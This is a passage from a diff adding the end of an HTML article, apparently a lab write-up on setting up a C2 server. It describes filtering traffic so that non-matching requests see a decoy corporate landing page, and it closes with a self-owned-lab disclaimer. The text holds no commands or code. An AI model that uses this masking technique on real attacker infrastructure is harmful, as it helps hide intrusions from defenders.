+                Requests that don't match the C2 path or User-Agent are served a corporate decoy landing page
+                ("Apex Digital Solutions"), effectively masking the real purpose of the server.
+            </p>
+
+            <figure>
+                <a href="/articles/c2-deployment/assets/Pasted%20image%2020260601081828.png" class="image-popup">
+                    <img src="/articles/c2-deployment/assets/Pasted%20image%2020260601081828.png" alt="Decoy Landing Page">
+                </a>
+                <figcaption>Decoy corporate page — non-C2 traffic blends in as a legitimate business site.</figcaption>
+            </figure>
+
+            <blockquote>
+                <p>
+                    All systems targeted in this lab are my own. This is a controlled environment built for
+                    education and practice. The goal is to demonstrate how simple C2 traffic filtering works
+                    using commonly available tools — nothing more, nothing less. Advanced filtering techniques
+                    will be covered in a follow-up article.
+                </p>
+            </blockquote>
+
+            <!-- Share -->
+            <div class="share-section">
+                <h4>Share this article</h4>
+                <div class="share-buttons">
+                    <button class="share-btn" data-action="twitter"><i class="fab fa-x-twitter"></i> Twitter</button>
+                    <button class="share-btn" data-action="linkedin"><i class="fab fa-linkedin"></i> LinkedIn</button>
+                    <button class="share-btn" data-action="telegram"><i class="fab fa-telegram"></i> Telegram</button>
+                    <button class="share-btn" data-action="copy"><i class="fas fa-link"></i> Copy Link</button>
+                </div>
+            </div>
+
+        </article>
+    </main>
+
+    <footer class="article-footer" style="position:relative;z-index:1;">
+        <p>&copy; 2025 <a href="/">0x1Ak4sh</a> - All rights reserved.</p>
+    </footer>
+
+    <button class="back-to-top" title="Back to top">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script src="/js/snake.js"></script>
+    <script src="/js/article.js"></script>
+</body>
+
+</html>
